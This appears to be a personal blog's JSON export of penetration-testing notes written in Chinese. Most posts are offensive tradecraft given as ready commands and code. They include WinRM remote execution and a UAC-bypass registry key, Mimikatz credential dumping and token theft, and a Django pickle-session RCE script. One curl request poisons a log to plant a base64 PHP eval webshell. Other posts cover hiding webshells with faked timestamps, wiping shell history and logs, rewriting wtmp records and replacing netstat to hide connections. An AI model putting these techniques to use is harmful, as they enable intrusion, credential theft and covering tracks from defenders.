{"meta":{"title":"Breezy_Struggle","subtitle":"Select * from world where someone like u ","description":"","author":"Breezy","url":"http://yoursite.com","root":"/"},"pages":[{"title":"About","date":"2020-06-24T14:00:04.000Z","updated":"2020-06-24T14:00:04.860Z","comments":true,"path":"About/index.html","permalink":"http://yoursite.com/About/index.html","excerpt":"","text":""}],"posts":[{"title":"0x05 New Begin","slug":"0x05-New-Begin","date":"2021-01-02T11:29:38.000Z","updated":"2021-01-02T11:35:20.337Z","comments":true,"path":"2021/01/02/0x05-New-Begin/","link":"","permalink":"http://yoursite.com/2021/01/02/0x05-New-Begin/","excerpt":"","text":"一年匆匆过去，回忆起来总感觉不平凡的2020走的太快，没留下什么深刻印象。 比较真实的体验就是一些自己时代的人陆续离场，像假新闻一般真实。 唯一值得纪念的就是又重新和她在一起了，也有了人生两大满足的猫和电脑。 越接触才发现大部分内容的堆叠以及表面。 愿2021能够找到自己学习进步的坐标。 12340x00 读50本书0x01 C#开发0x02 坚持跑步0x03 坚持记录","categories":[],"tags":[],"author":"Breezy"},{"title":"0x04 Winrm利用","slug":"0x04-Winrm利用","date":"2020-09-01T00:57:09.000Z","updated":"2020-09-07T23:53:20.770Z","comments":true,"path":"2020/09/01/0x04-Winrm利用/","link":"","permalink":"http://yoursite.com/2020/09/01/0x04-Winrm%E5%88%A9%E7%94%A8/","excerpt":"","text":"WinRM(Windows Remote Management)远程管理，是一种允许管理员远程执行系统管理任务的服务。基于Powershell,通过HTTP（5985）或HTTPS SOAP（5986）执行通信，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。 使用此服务需要管理员级别凭据双方都需要开启winrm(Win7开始支持，Server12后默认开启) 配置1234567891011121314--开启--winrm quickconfig -q 启动服务并设置为自启动 添加防火墙例外规则 添加监听配置或Powershell下 Enable-PSRemoting -Force--配置--winrm get winrm&#x2F;config 获取配置信息winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125; 配置信任管理源winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;&quot;&#125; 删除信任winrm e winrm&#x2F;config&#x2F;listener 查看监听设置winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;true&quot;&#125; 启用80端口复用winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;false&quot;&#125; 关闭winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;80&quot;&#125; 修改默认监听端口为80 开启端口复用主要利用IIS自带驱动http.sys的端口共享功能Port Sharing。所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可 1netsh http show servicestate 查看注册的url前缀 管理 Winrs 12winrs -r:http:&#x2F;&#x2F;192.168.1.152:5985 -u:administrator -p:admin123 &quot;whoami &#x2F;all&quot; # 执行单条命令winrs -r:http:&#x2F;&#x2F;192.168.1.152:5985 -u:administrator -p:admin123 cmd # 返回交互式cmd Powershell 123456789$ip&#x3D;&quot;192.168.1.116&quot;#$ip&#x3D;&quot;192.168.1.20&quot;Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value $ip -Force$securePassword &#x3D; ConvertTo-SecureString -AsPlainText -Force &#39;pass&#39;$cred &#x3D; New-Object System.Management.Automation.PSCredential &#39;pass&#39;, $securePassword$cmd &#x3D; &#123;ls C:\\users\\public&#125;Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock $cmdEnter-PSSession -ComputerName 192.168.100.155 -Credential administrator 返回交互式shell Winrm 12winrm -hostname remote.domain.com -username &quot;Administrator&quot; -password &quot;secret&quot; &quot;ipconfig &#x2F;all&quot;winrm invoke create wmicimv2&#x2F;win32_process @&#123;commandline&#x3D;&quot;\\\\192.168.12.20\\c\\test.exe&quot;&#125; HTTP Server API 123456netsh http add urlacl url&#x3D;http:&#x2F;&#x2F;+:80&#x2F;MyUri user&#x3D;everyone 添加urlacl 管理员权限除此之外可以利用已存在的urlaclnetsh http show urlacl http:&#x2F;&#x2F;+:80&#x2F;Temporary_Listen_Addresses&#x2F; 默认存在https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;Homework-of-C-Language&#x2F;blob&#x2F;master&#x2F;HTTPServerWebshell.cpptest.exe http:&#x2F;&#x2F;xx:80&#x2F;url BypassUAC通过修改注册表使得除了administrator之外的本地管理用户能够直接绕过UAC通过Winrm进行高权限管理 1reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f","categories":[],"tags":[],"author":"Breezy"},{"title":"0x03 Session 切换","slug":"Runas-Tip","date":"2020-08-31T01:39:00.000Z","updated":"2020-09-06T11:04:08.133Z","comments":true,"path":"2020/08/31/Runas-Tip/","link":"","permalink":"http://yoursite.com/2020/08/31/Runas-Tip/","excerpt":"","text":"坚持记录 Runas TipsRunas 系统内置用户session切换命令,用于在用户间切换，无法切换到System 交互式 1runas &#x2F;user:(user@domain|domain\\user) &#x2F;noprofile command(必须为双引号包裹) 非交互式使用Runas执行命令 1234567891011121314151617181920212223cscript xxxx.vbsdim WshShell,cmd cmd&#x3D;&quot;%SystemRoot%\\system32\\cmd.exe&quot; Set WshShell&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;) WshShell.Run cmdWScript.Sleep 500WshShell.SendKeys&quot;runas &#x2F;noprofile &#x2F;user:workgroup\\administrator &quot;&quot;cmd &#x2F;c netstat -ano &gt; c:\\windows\\temp\\TS_AK74.tmp&quot;&quot;&quot;WshShell.SendKeys&quot;&#123;ENTER&#125;&quot; WScript.Sleep 500 WshShell.SendKeys&quot;123456&quot;WshShell.SendKeys&quot;&#123;ENTER&#125;&quot; WScript.Sleep 5000WshShell.SendKeys&quot;exit&quot;WshShell.SendKeys&quot;&#123;ENTER&#125;&quot; VBS中双引号使用&quot;&quot; 进行转义切换Session后对其特定的net session net use 进行查看 或者对特定权限用户目录进行访问而不用修改文件夹权限icacls fle&#x2F;diricacls file&#x2F;dir &#x2F;grant user:(OI)(CI)(I) F &#x2F;T 蜜罐 12345runas 使用netonly参数在网络认证时才会发送密码进行认证 在本地可以通过输入任意密码启动cmd session作用范围为当前用户密码会被写入到lsass进程中 runas &#x2F;netonly &#x2F;user:xxx cmd.exe可用来设置蜜罐账户 检测蜜罐密码是否被使用 通过/netonly参数，只要不经过网络认证就不会对身份进行检测，任意输入密码启动为administrator会话,继续查看当前用户权限依然为本地用户。 通过Mimikatz抓取密码 12privilege::debugsekurlsa::logonpasswords 任意输入的密码被抓取成功 服务 scsc 是内置的服务配置命令，可以通过管理权限添加服务从而以服务权限运行程序。12345678sc query xxxx 查询服务状态sc create xxxx binpath&#x3D; &quot;c:\\windows\\system32\\cmd.exe &#x2F;c whoami &gt; c:\\windows\\temp\\TS_AK7J.tmp&quot; 创建服务sc config xxxx obj&#x3D; localsystem start&#x3D; auto binpath&#x3D; &quot;c:\\windows\\system32\\cmd.exe &#x2F;c whoami &gt; c:\\windows\\temp\\TS_AK7J.tmp&quot;sc qc xxxxx 查询配置信息sc start xxxxxsc stop xxxxsc delete xxxxxsc config xxxx start&#x3D; disabled&#x2F;demand 禁用或手动 sc命令支持RPC调用，可以通过UNC路径远程创建服务sc \\\\ip create xxxxx, 其中obj可以设置为localsystem、本机存在的用户名如果需要认证则要config单独配置password1sc config xxxx obj&#x3D; &quot;user&quot; password&#x3D;&quot;$pass&quot; 用户列表可以在services.msc 中配置服务的属性登录选项中选择高级进行查找 计划任务 at低版本系统(Win7及以下)支持at命令，默认以system启动12at \\\\ip time command配合net time \\\\ip 获取远程时间 schtasks高版本废弃at命令需要使用更多功能的schtasks123schtasks &#x2F;create &#x2F;TN 任务名 &#x2F;SC 周期(daily&#x2F;weekly) &#x2F;ST 时间(23:00) &#x2F;TR 运行程序(notepad.exe) &#x2F;RU 执行用户(system)schtasks &#x2F;query [&#x2F;TN TestService2]schtasks &#x2F;delete &#x2F;TN &#x2F;F Token窃取用户Token获取system权限 12icognito.exeCobaltstrike steal_token Other123psexec -accepteula -i cmd -s 启动system权限命令行创建system权限服务打开命名管道，通过命名管道执行命令","categories":[],"tags":[],"author":"Breezy"},{"title":"0x02 比赛分享","slug":"0x02-比赛分享","date":"2020-08-31T01:15:46.000Z","updated":"2021-01-02T11:28:43.704Z","comments":true,"path":"2020/08/31/0x02-比赛分享/","link":"","permalink":"http://yoursite.com/2020/08/31/0x02-%E6%AF%94%E8%B5%9B%E5%88%86%E4%BA%AB/","excerpt":"","text":"外网:123456DNS域传送 发现目标dig axfr @server_ip query_domainnslookup&gt;server server_ip &gt;ls query_domain 1、PHP 反序列化字符串逃逸123456任意文件读取 file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd 为进程当前工作目录如Web应用为运行的当前脚本目录 通过该方式可以任意读取文件反序列化字符串逃逸 可参考去年的Joomla 3.4.0-3.4.6 由于解析字符串单双引号对\\0的处理差异 导致字符串逃逸通过中间处理过程对序列化内容过滤或者格式化引起字符的增加和减少 2、Django RCE123456789101112131415161718192021222324252627282930313233343536格式化字符串漏洞&#123;&#125; 通过&#39;&#123;&#125;&#39;.format(param) param输入为&#123;&#125; 内接django变量名可以读取变量值通过&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; 读取secretkey由于版本低于1.6 可以通过session反序列化RCE# coding: utf-8from django.contrib.sessions.serializers import PickleSerializerfrom django.core import signingfrom django.conf import settingssettings.configure(SECRET_KEY&#x3D;&#39;xxxxxxxxxxxxxxxxxxx&#39;)class Run(object): def __reduce__(self): import os return (os.system,(&#39;xxxxxx&#39;,))sess &#x3D; signing.dumps( obj&#x3D;GetShellWithPython(), serializer&#x3D;PickleSerializer, salt&#x3D;&#39;django.contrib.sessions.backends.signed_cookies&#39;)import urllib2import cookieliburl &#x3D; &#39;http:&#x2F;&#x2F;url&#39;headers &#x3D; &#123;&#39;Cookie&#39;:&#39;sessionid&#x3D;&quot;%s&quot;&#39; %(sess)&#125;request &#x3D; urllib2.Request(url,headers &#x3D; headers)搭建目标对应版本django django startserver hellocd hello&#x2F;hello在django上下文环境执行该脚本实现RCE也可以自行通过Curl发送Cookiecurl url --cookie &quot;sessionid&#x3D;cookie&quot; 3、PHP CMS Monstra12345678910111213141516171819 3.04 后台进入可上传php7绕过黑名单过滤 漏洞原因为可能发行时未考虑php7兼容性而在某些版本的系统下 全局配置中 有添加针对php7解析的内容&#x2F;etc&#x2F;mime.types&#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php7.0.conf&#x2F;etc&#x2F;apache2&#x2F;apache2.conf&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf参考 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7850http:&#x2F;&#x2F;xxxxxxx&#x2F;storage&#x2F;database&#x2F;users.table.xml 泄露敏感信息--用户账号及加密后hash加密算法在 engine&#x2F;security.php 加上盐值一般未修改 可进行枚举define(&#39;MONSTRA_PASSWORD_SALT&#39;, &#39;YOUR_SALT_HERE&#39;); md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));这边的做法是后台验证码 任意文件包含 通过包含日志文件getshell因为日志太多不建议直接写shell 通过访问存在路径作为参数写入curl -v &quot;http:&#x2F;&#x2F;url&#x2F;index.php?&lt;?php file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;plugins&#x2F;captcha&#x2F;crypt&#x2F;cryptogr4php.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWydjb3JuJ10pOz8+&#39;))?&gt;&quot;会提示400 但是能够写入到access_log下利用包含生成shell Burp直接发送+会被记录成完整的+号 随后才会被中间件解析成空格 4、IIS 8.5 +PHP 上传123456789101112131415161718php cgi.fix_pathinfo 配置漏洞 访问 xxx.jpg&#x2F;.php 实现解析上传Windows NTF 文件绕过后缀黑名单xxxxx::$INDEX_ALLOCATION 可创建 xxxx 文件夹 配合 IIS6.0目录解析漏洞使用test.php:a.jpg 创建文件为test.php 内容为空 结合 windows 特殊通配符&gt;&gt;&gt; 和??? 对文件内容写入test.php::$DATA\\1.jpg 创建1.jpg 结合解析漏洞使用Windows格式化文件名绕过黑名单test.php.test.php空格test.php%0atest.php_https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2539上传后通过Windows 短文件名 结合时间戳爆破shellhttps:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;IIS_shortname_Scanner.git 5、ThinkPHP5123字段缓存漏洞 通过注入点多语句执行，新建表并修改字段名称，写入到xxxx.php中getshellTP通过数组提交可绕过过滤 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;153286.html 6.OAshiro 721 反序列化 爆破key 8.dedecms后台弱口令 后台编辑模板 getshell 内网12345678910Weblogic 2019-2725Atlassian CVE-2019-11580 rce https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2019-11580ms17_010msf win8版本可打2012 某些版本net sessions 查看远程连接记录(被连)cmdkey &#x2F;listsekurlsa::ssp 获取远程连接凭证","categories":[],"tags":[],"author":"Breezy"},{"title":"0x01 迟到的第二篇文","slug":"0x01-迟到的第二篇文","date":"2020-08-28T14:24:15.000Z","updated":"2021-01-02T11:28:33.239Z","comments":true,"path":"2020/08/28/0x01-迟到的第二篇文/","link":"","permalink":"http://yoursite.com/2020/08/28/0x01-%E8%BF%9F%E5%88%B0%E7%9A%84%E7%AC%AC%E4%BA%8C%E7%AF%87%E6%96%87/","excerpt":"","text":"第二篇文章记录一点内网渗透时候的Tip(当前遇到) 0x00 Attention Getshell 后针对解释性语言如PHP等可热加载解析的可以适当将shell藏到正常目录下，要修改内容以防Hash匹配，Linux可以使用touch命令修改文件时间touch -r old_date_file your_evil_shell,Windows可以结合Powershell更改文件的创建访问及修改时间。 (ls)[num]|fl *形如$(ls)返回当前目录下的文件，数组序号对单文件进行选择，将结果通过管道符给fl命令输出 123(Get-ChildItem file_name).CreationTime&#x3D;&#39;2020&#x2F;6&#x2F;24 21:23:52&#39; 对指定时间进行修改为了更方便可以改为(Get-ChildItem file_name).CreationTime&#x3D;(Get-ChildItem exist_file_name).CreationTime","categories":[],"tags":[],"author":"Breezy"},{"title":"0x00 Linux 痕迹清理","slug":"0x00","date":"2020-08-03T14:32:57.000Z","updated":"2020-08-04T01:14:52.560Z","comments":true,"path":"2020/08/03/0x00/","link":"","permalink":"http://yoursite.com/2020/08/03/0x00/","excerpt":"","text":"Linux 痕迹清理常见命令history 命令 123456789101112131415161718192021history 查看当前session历史命令缓冲区及历史命令文件高级用法export HISTTIMEFORMAT&#x3D;&#39;%F %T &#39;history |more 可以查看到历史命令的具体时间 &#x2F;bin&#x2F;bash下测试有效CTRL+r 进入历史命令搜索模式 输入部分关键字 搜索后回车执行快速执行上一条命令!!上!-1(同样在查看到编号后可以!+数字执行)ctrl p有关变量HISTSIZE 指定历史记录文件的大小HISTFILE 指定记录历史命令的文件history -c 清除当前shell对应的所有的命令历史(直接清空文件) 需要注意不同的执行环境history -a 将历史命令缓冲区内容写入到文件中(多个session)history -w 将当前历史命令缓冲区内容写入到文件中history -r 清除当前历史命令缓冲区的内容 根据上述命令，每一次session结束后会自动将命令执行，缓冲区的内容写入到历史命令记录文件中。因此可以在每次执行结束后执行history -r清除。也可以指定export HISTFILE=为空或者置为/dev/null让结束后命令历史写入的文件不存在。也可以修改HISTSIZE为0，禁止写入到历史记录文件中。 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 如果在日志中已经有了记录，可以在无痕状态下使用sed进行清除sed -i &#39;/content/&#39;d file 相关文件123456789101112131415161718192021222324last-----&gt; &#x2F;var&#x2F;log&#x2F;wtmp 记录计算机重启和登入的情况lastlog-----&gt; &#x2F;var&#x2F;log&#x2F;lastlog 记录用户上一次登录历史lastb------&gt; &#x2F;var&#x2F;log&#x2F;btmp 记录登录失败历史w----------&gt;&#x2F;varr&#x2F;run&#x2F;utmp w命令查看当前在线&#x2F;var&#x2F;log&#x2F;message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一&#x2F;var&#x2F;log&#x2F;secure 与安全相关的日志信息&#x2F;var&#x2F;log&#x2F;maillog 与邮件相关的日志信息&#x2F;var&#x2F;log&#x2F;cron 与定时任务相关的日志信息&#x2F;var&#x2F;log&#x2F;spooler 与UUCP和news设备相关的日志信息&#x2F;var&#x2F;log&#x2F;boot.log 守护进程启动和停止相关的日志消息&#x2F;var&#x2F;log&#x2F;auth.log 系统登录日志(debian系统)~&#x2F;.bash_history 其余的tcsh、zsh、sh、ksh等~&#x2F;.mysql_history mysql命令执行历史~&#x2F;.viminfo 记录vim 操作记录 可还原写入文件其余一些web服务的日志&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log ---error.log等&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log很多Java中间件或组件的日志会存在应用目录的log目录下如tomcat的catalina.out,activeMq的activemq.log更具体的路径可以相应查看log.properties或者log4j.properties以及代码中的设置 对于文件的删除比较粗糙可以直接echo &gt; file清空，也可以稍微精细一点使用sed对文本文件进行删除。对于wtmp,btmp,utmp这种二进制文件可以使用logtamper(可以隐藏w连接并清除掉指定的ip登录记录，对于lastlog只能修改登录时间)，fake_login_log.py可以进一步对登录信息进行隐藏。 1234Linux可以使用如下命令将二进制文件转换为文本后操作utmpdump &#x2F;var&#x2F;log&#x2F;wtmp |sed &quot;s&#x2F;192.168.233.132&#x2F;1.1.1.1&#x2F;g&quot; |utmpdump -r &gt;&#x2F;tmp&#x2F;wtmp1 &amp;&amp;\\mv &#x2F;tmp&#x2F;wtmp1 &#x2F;var&#x2F;log&#x2F;wtmpUnix&#x2F;usr&#x2F;lib&#x2F;acct&#x2F;fwtmp &lt; &#x2F;var&#x2F;adm&#x2F;wtmpx | sed &quot;s&#x2F;192.168.8.88&#x2F;localhost&#x2F;g&quot; | &#x2F;usr&#x2F;lib&#x2F;acct&#x2F;fwtmp -ic &gt; &#x2F;var&#x2F;adm&#x2F;wtmpx Tip123456789ssh -T root@127.0.0.1 &#x2F;bin&#x2F;bash -i -T参数隐藏w命令查看ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i 不记录Linux公钥到known_hosts中直接查看网络连接netstat -antp| grep 22还是存在的进一步简单的隐藏可以备份bin文件替换成其他可执行sh文件写入命令过滤自己的连接which netstat cp &#x2F;path&#x2F;netstat &#x2F;path&#x2F;netstat.bakvi &#x2F;path&#x2F;netstat ----&gt; &#x2F;path&#x2F;netstat.bak $&#123;*&#125; &#125; |grep -v ip 更深层次就需要进行Hook或者驱动级隐藏 其实渗透就和下棋一样，步步为营，每走一步都需要细致的考虑会造成什么影响，在结束后进行还原，上传什么文件，不用后马上删掉。宁可慢一点检查一遍命令，也不要随意复制乱敲，导致后续需要花费更大的功夫来补救。","categories":[],"tags":[],"author":"Breezy"}],"categories":[],"tags":[]}